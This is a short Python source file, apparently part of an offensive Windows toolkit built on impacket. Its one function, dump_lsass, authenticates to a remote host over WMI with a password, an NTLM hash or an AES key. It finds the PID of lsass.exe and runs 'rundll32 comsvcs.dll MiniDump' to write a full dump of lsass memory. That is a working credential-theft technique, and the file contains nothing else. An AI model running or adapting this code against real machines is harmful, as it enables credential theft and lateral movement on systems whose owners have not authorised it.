from module import *
from module import wmiconnect
from module import cmdrun

def dump_lsass(ip='', username='', password='',domain='',hashes='',aesKey=''):
    print("[*] Query Lsass PID")
    dcom, iWbemLevel1Login = wmiconnect.wmiconnect(ip, username, password, domain, hashes, aesKey)
    iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
    iWbemLevel1Login.RemRelease()
    win32Process, _ = iWbemServices.GetObject("Win32_Process")
    iEnumWbemClassObject = iWbemServices.ExecQuery("select * from Win32_Process where Name=\"lsass.exe\"")
    iWbemClassObject = iEnumWbemClassObject.Next(0xffffffff, 1)[0]
    lsass_pid=iWbemClassObject.Handle
    print("[*] the lsass PID:{}".format(lsass_pid))
    cmd=r"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump {} lsass.dmp full&&dir C:\windows\System32\lsass.dmp".format(lsass_pid)
    cmdrun.exec_command(ip, username, password, domain, hashes,aesKey,cmd)

